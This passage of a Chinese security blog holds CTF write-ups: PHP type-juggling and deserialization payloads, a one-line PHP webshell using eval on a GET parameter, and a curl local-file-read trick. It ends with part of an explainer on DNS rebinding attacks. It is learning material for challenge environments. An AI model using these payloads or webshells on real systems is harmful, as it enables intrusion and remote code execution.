<p>因此直接执行<code>print_r(scandir(dirname(__FILE__)));</code>并返回</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988680_622b0d88d2b3473a44731-166727395787431.jpeg" alt="img"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">phpinfo`查看当前目录，`<span class="regexp">/opt/</span>lampp<span class="regexp">/htdocs/</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988683_622b0d8b6fba70304dd15-166727395787432.jpeg" alt="img"></p>
<p>构造最终<code>payload</code>读取<code>Here_1s_7he_fl4g_buT_You_Cannot_see.php</code>文件内容，即flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988684_622b0d8cd166d59b7b4d2-166727395787433.jpeg" alt="img"></p>
<h3 id="框架链子"><a class="markdownIt-Anchor" href="#框架链子"></a> 框架链子</h3>
<p>还有一些框架转有的链子，详情遇到再说哦，这里就不过多阐述了QwQ。</p>
<p>祝师傅们，反序列化玩的开心~</p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>2023启动计划</title>
    <url>/2023/01/%E6%96%B0%E5%B9%B4%E5%90%AF%E5%8A%A8%E8%AE%A1%E5%88%92/</url>
    <content><![CDATA[<p>[<strong>置顶</strong>]</p>
<p>写个计划，没动力的时候来看一下</p>
<span id="more"></span>
<p>2023启动计划，每日一题，题目内容不限，BiliBili按时打卡</p>
<h2 id="why"><a class="markdownIt-Anchor" href="#why"></a> Why</h2>
<p><strong>为什么突然要弄这样一个形式化的东西？</strong></p>
<p>这样确实很形式化，但是在这短短的几月里我认识到自己并不能很好的将所想转化为所做！</p>
<p><strong><code>拖延</code></strong> \<code>“等会儿就去”</code>\<code>有空就整</code>\<code>下次一定</code>\<code>“这周有考试，可以玩几天”</code>\</p>
<p><strong><code>自大</code></strong> 、<strong><code>浮躁</code></strong>、<strong><code>不踏实</code></strong>、<strong><code>空想主义</code></strong>\<code>&quot;我会的真多&quot;</code>\<code>&quot;我真牛*&quot;</code>\</p>
<p>所以想逼自己一把，把自己按在板凳上，电脑前，好好地、踏实地、学有所成的、去拼搏一把。</p>
<blockquote>
<p><em><strong>#拒绝自我感动</strong></em></p>
<p><em><strong>#拒绝装模作样</strong></em></p>
<p><em><strong>#拒绝违背初心</strong></em></p>
<p><em><strong>#拒绝不切实际</strong></em></p>
<p><em><strong>#拒绝放纵自己</strong></em></p>
</blockquote>
<p>2023，焕然一新？还是一成不变？</p>
]]></content>
      <categories>
        <category>每日一题</category>
      </categories>
      <tags>
        <tag>每日一题</tag>
      </tags>
  </entry>
  <entry>
    <title>【每日一题】--Writeup</title>
    <url>/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/</url>
    <content><![CDATA[<p>【每日一题】</p>
<p>这是每日一题打卡计划的Writeup，主要为Writeup和对题目的简略思考QAQ</p>
<span id="more"></span>
<h1 id="day001"><a class="markdownIt-Anchor" href="#day001"></a> DAY–001</h1>
<h2 id="easyphp"><a class="markdownIt-Anchor" href="#easyphp"></a> easyphp[*]</h2>
<p>这里选择的第一题是攻防世界里江苏工匠杯的一道web题</p>
<h3 id="解题过程"><a class="markdownIt-Anchor" href="#解题过程"></a> 解题过程</h3>
<p>获取容器，访问链接，能够直接获取题目主要源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Emmm...再想想&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Emmm...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> &amp;&amp; <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;Hgfks.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You&#x27;re right&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先找到直观的<code>$flag</code>，发现获取条件是需要<code>$key1 &amp;&amp; $key2</code>,同时包含&quot;Hgfks.php&quot;</p>
<p>接下来回到源码主体，找<code>$key1 &amp;&amp; $key2</code>的条件。能够看到都需要等于1。</p>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20221231003448624.png" alt="$key1 &amp;&amp; $key2"></p>
<p>首先来看$key1被赋值为1的条件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Emmm...再想想&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Emmm...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里是对a和b的一些条件限制，首先<code>intval($a)</code>这里没有对a进行限制，默认a是10进制数，主要是后面的<code>&gt; 6000000 &amp;&amp; strlen($a) &lt;= 3</code>,大于6e6且长度小于3，这里可以直接用科学记数法直接bypass，a=7e7即可。</p>
<p>接下来看对b的限制，<code>isset($b) &amp;&amp; '8b184b' === substr(md5($b),-6,6)</code>不为空，且md5值的后六位为<em>8b184b</em>，这里可以上一个hash爆破的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">md5 = <span class="string">&quot;8b184b&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    m = random.randint(<span class="number">10</span> ** <span class="number">11</span>, <span class="number">10</span> ** <span class="number">12</span> - <span class="number">1</span>)</span><br><span class="line">    m = <span class="built_in">str</span>(m)</span><br><span class="line">    MD5 = hashlib.md5()</span><br><span class="line">    MD5.update(m.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    flag = MD5.hexdigest()</span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">6</span>:] == md5:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;碰撞成功：&quot;</span> + flag)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;明文为:&quot;</span> + m)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;waiting------&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里爆破出来是</p>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20221231004718483.png" alt="b-hash爆破"></p>
<p>所以，b=368400238809</p>
<p>至此，key1=1的条件都满足，做个测试</p>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20221231005004490.png" alt="test"></p>
<p>接下来看key2=1的条件:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先看对c的条件限制<code>is_array($c) </code>\<code>$c=(array)json_decode(@$_GET['c'])</code>,c为数组类型，且是双数组同时c在GET请求前会被json编码一次。。</p>
<p>对m的限制<code>!is_numeric(@$c[&quot;m&quot;]) &amp;&amp; $c[&quot;m&quot;] &gt; 2022</code>,来看一下</p>
<p><code>!is_numeric()</code>函数的限制特点，限制返回的数不为数字和数字字符串。且m的值还得被解析为大于2022的整数。在php中字符串和与数字相比较是会被强制转化为整型，所以这里可以用“2023TWe1v3”来进行比较，会被转化为“2023”与“2022”相比较，满足m的条件了。</p>
<p>**小tip—&gt;这里做个test：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$m</span>) &amp;&amp; <span class="variable">$m</span> &gt; <span class="number">123</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;u are right!&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;u are false~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>m=1234   false</code></p>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20221231012150363.png" alt="m=1234"></p>
<p><code>m=1234a  true</code></p>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20221231012307478.png" alt="image-20221231012307478"></p>
<p>【回归正题】</p>
<p>对n的限制<code>if(is_array(@$c[&quot;n&quot;]) &amp;&amp; count($c[&quot;n&quot;]) == 2 &amp;&amp; is_array($c[&quot;n&quot;][0]))</code>,变量n必须为数组且有两个。</p>
<p>往下跟<code>array_search(&quot;DGGJ&quot;, $c[&quot;n&quot;])</code>这里的array_search()是在数组变量n中匹配“DGGJ”，匹配到返回TRUE，反之返回FALSE。同理和弱类型比较相近似，在php中字符串和与数字相比较是会被强制转化为整型，“DGGJ”转化为整形就是0，所以到这儿就可以完成了</p>
<h3 id="构建最后的payload"><a class="markdownIt-Anchor" href="#构建最后的payload"></a> 构建最后的<strong>payload</strong>：</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=<span class="number">7e7</span>&amp;b=<span class="number">368400238809</span>&amp;c=&#123;<span class="string">&quot;m&quot;</span>:<span class="string">&quot;2023TWe1v3&quot;</span>,<span class="string">&quot;n&quot;</span>:[[<span class="number">0</span>],<span class="number">0</span>]&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20221231013604850.png" alt="flag"></p>
<h1 id="day002"><a class="markdownIt-Anchor" href="#day002"></a> DAY–002</h1>
<h2 id="hnctf-2022-week1easy_upload-"><a class="markdownIt-Anchor" href="#hnctf-2022-week1easy_upload-"></a> [HNCTF 2022 Week1]easy_upload[*-]</h2>
<h3 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h3>
<p>今天感染了奥密克戎，一直在发烧，很迷糊，说话也是有气无力的，就浅浅的拿新生赛的题来水几天‘‘‘‘’’’’</p>
<h3 id="解题过程-2"><a class="markdownIt-Anchor" href="#解题过程-2"></a> 解题过程</h3>
<p>打开链接，先简单测试一下上传的黑名单，上传一个1.php内容是：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>发现无过滤且能直接执行php文件，直接写一句话木马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span>(<span class="string">&quot;123&quot;</span>);@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;TW&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20221231212014794.png" alt="ez_upload"></p>
<p>结：这题纯面向新生，没有什么知识点的考察，一句话木马的编写，RCE命令执行。</p>
<h1 id="day003"><a class="markdownIt-Anchor" href="#day003"></a> DAY–003</h1>
<h2 id="xctf2016cat"><a class="markdownIt-Anchor" href="#xctf2016cat"></a> [XCTF2016]Cat   [**+]</h2>
<h3 id="解题过程-3"><a class="markdownIt-Anchor" href="#解题过程-3"></a> 解题过程</h3>
<p>首先能够测试到这儿有一个curl能够ping通本地127.0.0.1</p>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20230108224940559.png" alt="Cat-01"></p>
<p>就以为是拼接命令执行，试了半天都没回显</p>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20230108225730225.png" alt="Cat-02"></p>
<p>开始手动fuzz（ps：）不想用bp哈哈哈）</p>
<p>不停的输入测试可以发现能够解析十六进制的ASCII码值</p>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20230108235444601.png" alt="Cat03"></p>
<p>可以试试超出ASCII编码范围看看解析是否报错<code>%80</code></p>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20230109002835753.png" alt="Cat04"></p>
<p>简单看一下报错回显，发现在报错回显泄露了数据库的绝对路径，使用<code>@+绝对路径</code>可以直接访问，访问一下：</p>
<p><img src="/2023/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-Writeup/image-20230109004055212.png" alt="Cat-05"></p>
<p>能够在大量报错回显中发现flag</p>
<h3 id="构建最后的payload-2"><a class="markdownIt-Anchor" href="#构建最后的payload-2"></a> 构建最后的<strong>payload</strong>：</h3>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">?url=@/opt/api/database.sqlite3</span><br></pre></td></tr></table></figure>
<h1 id="day004"><a class="markdownIt-Anchor" href="#day004"></a> DAY–004</h1>
<h2 id="wdctf4-1"><a class="markdownIt-Anchor" href="#wdctf4-1"></a> [WDCTF]4-1 [*]</h2>
<h3 id="解题过程-4"><a class="markdownIt-Anchor" href="#解题过程-4"></a> 解题过程</h3>
<p><code>binwalk -e ./</code>分离出图片中的压缩包，解压后根据tips.txt提示第二张比第一张图片多一些东西，可大概推断出这是盲水印隐写，github上找BlindWaterMark-master，运行脚本即可。</p>
<h1 id="day005"><a class="markdownIt-Anchor" href="#day005"></a> DAY–005</h1>
<p>【略】</p>
<h1 id="day006"><a class="markdownIt-Anchor" href="#day006"></a> DAY–006</h1>
<p>【略】</p>
<h1 id="day007"><a class="markdownIt-Anchor" href="#day007"></a> DAY–007</h1>
<h2 id="nisactf-2022popchains"><a class="markdownIt-Anchor" href="#nisactf-2022popchains"></a> [NISACTF 2022]popchains [***]</h2>
<h3 id="前言-2"><a class="markdownIt-Anchor" href="#前言-2"></a> 前言</h3>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="variable">__invoke</span>():当尝试以调用函数的方式调用对象的时候，就会调用该方法</span><br><span class="line"><span class="variable">__construst</span>():具有构造函数的类在创建新对象的时候，回调此方法</span><br><span class="line"><span class="variable">__destruct</span>():反序列化的时候，或者对象销毁的时候调用</span><br><span class="line"><span class="variable">__wakeup</span>():反序列化的时候调用</span><br><span class="line"><span class="variable">__sleep</span>():序列化的时候调用</span><br><span class="line"><span class="variable">__toString</span>():把类当成字符串的时候调用，一般在<span class="built_in">echo</span>处生效</span><br><span class="line"><span class="variable">__set</span>():在给不可访问的(protected或者<span class="keyword">private</span>)或者不存在的属性赋值的时候，会被调用</span><br><span class="line"><span class="variable">__get</span>():读取不可访问或者不存在的属性的时候，进行赋值</span><br><span class="line"><span class="variable">__call</span>():在对象中调用一个不可访问的方法的时候，会被执行</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>每日一题</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>每日一题</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈DNS Rebinding</title>
    <url>/2023/04/%E6%B5%85%E8%B0%88DNS-rebinding/</url>
    <content><![CDATA[<p>为啥突然要总结一下这个很老的知识点，我也不知道，可能太菜了，闲下来总得学点什么~</p>
<span id="more"></span>
<h1 id="dns-rebinding"><a class="markdownIt-Anchor" href="#dns-rebinding"></a> DNS Rebinding</h1>
<h2 id="0x01-攻击简介"><a class="markdownIt-Anchor" href="#0x01-攻击简介"></a> 0x01 攻击简介</h2>
<p><strong>DNS Rebinding</strong>也叫做DNS重绑定攻击或者DNS重定向攻击。在这种攻击中，恶意网页会导致访问者运行客户端脚本，攻击网络上其他地方的计算机。</p>
<p>在介绍DNS Rebinding攻击机制之前我们先了解一下Web同源策略，</p>
<h3 id="web同源策略"><a class="markdownIt-Anchor" href="#web同源策略"></a> Web同源策略</h3>
<p><strong>同源策略</strong>（英语：Same-origin policy）是指在Web浏览器中，允许某个网页脚本访问另一个网页的数据，但前提是这两个网页必须有相同的URL、主机名和端口号，一旦两个网站满足上述条件，这两个网站就被认定为具有相同来源。此策略可防止某个网页上的恶意脚本通过该页面的文档对象模型访问另一网页上的敏感数据，比如<code>XSS，XXE，SSRF</code>等基于网页上的恶意脚本攻击。</p>
<p>**同源的定义：**如果两个 URL 的 协议、域名、端口都相同的话，则这两个 URL 是<em>同源</em>。</p>
<p>同源策略对Web应用程序具有特殊意义，因为Web应用程序广泛依赖于HTTP cookie来维持用户会话(session)，所以必须将不相关网站严格分隔，以防止丢失数据泄露。</p>
<p>值得注意的是同源策略仅适用于脚本，这意味着某网站可以通过相应的HTML标签访问不同来源网站上的图像、CSS和动态加载 脚本等资源。而跨站请求伪造(CSRF)就是利用同源策略不适用于HTML标签的缺陷。</p>
<p><strong>所以从理论上来讲，同源策略是能够有效的保证：客户端脚本只能访问为脚本提供服务的同一主机上的内容。</strong></p>
<p>至此如何绕过Web同源策略也成了众多hacker研究的地方。</p>
<h2 id="0x02-攻击原理"><a class="markdownIt-Anchor" href="#0x02-攻击原理"></a> 0x02 攻击原理：</h2>
<p>这里说一下利用的TTL是什么：</p>
<blockquote>
<p>TTL是英语Time-To-Live的简称，意思为一条域名解析记录在DNS服务器中的存留时间。当各地的DNS服务器接受到解析请求时，就会向域名指定的NS服务器发出解析请求从而获得解析记录；在获得这个记录之后，记录会在DNS服务器中保存一段时间，这段时间内如果再接到这个域名的解析请求，DNS服务器将不再向NS服务器发出请求，而是直接返回刚才获得的记录；而这个记录在DNS服务器上保留的时间，就是TTL值。</p>
</blockquote>
<p><strong>即TTL的数值越小，修改记录后所受的影响生效越快。</strong></p>
<p>这里我们可以来构造一个DNS 重绑定的案例：</p>
<p>例如，要在192.168.32.10和127.0.0.1之间切换，我们可以将他们编码为dwords，使用<a href="https://lock.cmpxchg8b.com/rebinder.html">rbndr</a>工具：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="number">7</span>f000001<span class="selector-class">.c0a8200a</span><span class="selector-class">.rbndr</span>.us</span><br></pre></td></tr></table></figure>
<p>接下来，我们测试一下：</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"># host <span class="number">7f000001</span>.c0a8200a.rbndr.us</span><br><span class="line"><span class="number">7f000001</span>.c0a8200a.rbndr.us has address <span class="number">127.0.0.1</span></span><br><span class="line"># host <span class="number">7f000001</span>.c0a8200a.rbndr.us</span><br><span class="line"><span class="number">7f000001</span>.c0a8200a.rbndr.us has address <span class="number">127.0.0.1</span></span><br><span class="line"># host <span class="number">7f000001</span>.c0a8200a.rbndr.us</span><br><span class="line"><span class="number">7f000001</span>.c0a8200a.rbndr.us has address <span class="number">127.0.0.1</span></span><br><span class="line"># host <span class="number">7f000001</span>.c0a8200a.rbndr.us</span><br><span class="line"><span class="number">7f000001</span>.c0a8200a.rbndr.us has address <span class="number">192.168.32.10</span></span><br><span class="line"># host <span class="number">7f000001</span>.c0a8200a.rbndr.us</span><br><span class="line"><span class="number">7f000001</span>.c0a8200a.rbndr.us has address <span class="number">127.0.0.1</span></span><br><span class="line"># host <span class="number">7f000001</span>.c0a8200a.rbndr.us</span><br><span class="line"><span class="number">7f000001</span>.c0a8200a.rbndr.us has address <span class="number">127.0.0.1</span></span><br><span class="line"># host <span class="number">7f000001</span>.c0a8200a.rbndr.us</span><br><span class="line"><span class="number">7f000001</span>.c0a8200a.rbndr.us has address <span class="number">192.168.32.10</span></span><br><span class="line"># host <span class="number">7f000001</span>.c0a8200a.rbndr.us</span><br><span class="line"><span class="number">7f000001</span>.c0a8200a.rbndr.us has address <span class="number">127.0.0.1</span>                                                   </span><br></pre></td></tr></table></figure>
<p>由此就达到了一个DNS 重绑定的效果。</p>
<h2 id="0x03-攻击机制"><a class="markdownIt-Anchor" href="#0x03-攻击机制"></a> 0x03 攻击机制</h2>
<p>攻击者无法控制名称服务器的载体，所有解析主机名（或 IP 地址，仍然是有效主机名）的请求都被重定向到由攻击者控制和操作的备用名称服务器。例如，如果我们有一个网址为 <a href="http://www.example-a.com">www.example-a.com</a> 的网站，并且我们想要访问私有内部域邮件服务器或只能通过该特定私有 IP 地址访问的其他服务，则可以使用 DNS 重新绑定攻击来伪造这些地址之一。</p>
<p><img src="/2023/04/%E6%B5%85%E8%B0%88DNS-rebinding/image-20230404221756020.png" alt="image-20230404221756020"></p>
<h2 id="0x04-攻击示例"><a class="markdownIt-Anchor" href="#0x04-攻击示例"></a> 0x04 攻击示例</h2>
<ol>
<li>攻击者注册一个域名，例如 IP 地址为 1.3.5.7 的 <a href="http://www.evil.com">www.evil.com</a>，将其委托给自己的 DNS 服务器（1.3.5.4），并使用钓鱼链接或电子邮件获取 HTTP 流量。</li>
<li>DNS 服务器没有发送正常的 TTL 记录，而是发送了一个非常短的 TTL 记录（例如，1 秒），防止条目 [<a href="http://www.evil.com">www.evil.com</a>, 1.3.5.7] 的 DNS 响应被缓存在受害者的（192.168.1.10 ) 浏览器。</li>
<li>对手的服务器首先用包含服务器 IP 地址 (1.3.5.7) 的<code>JavaScript</code> 等恶意脚本响应受害者。</li>
<li>对手使用 <code>XMLHttpRequest (XHR)</code> 将 HTTP 请求或 HTTPS 请求直接发送到对手的服务器并加载响应。</li>
<li>恶意脚本允许对手将主机名重新绑定到防火墙后面的目标服务器的 IP 地址 (192.168.1.2)。</li>
<li>然后服务器响应对手的真实目标，即与受害者（192.168.1.10）同域的内部主机IP（192.168.1.2）。</li>
<li>由于同一个名称解析为这两个 IP 地址，浏览器会将这两个 IP 地址（1.3.5.7 和 192.168.1.2）置于同一安全区域并允许信息在地址之间流动。</li>
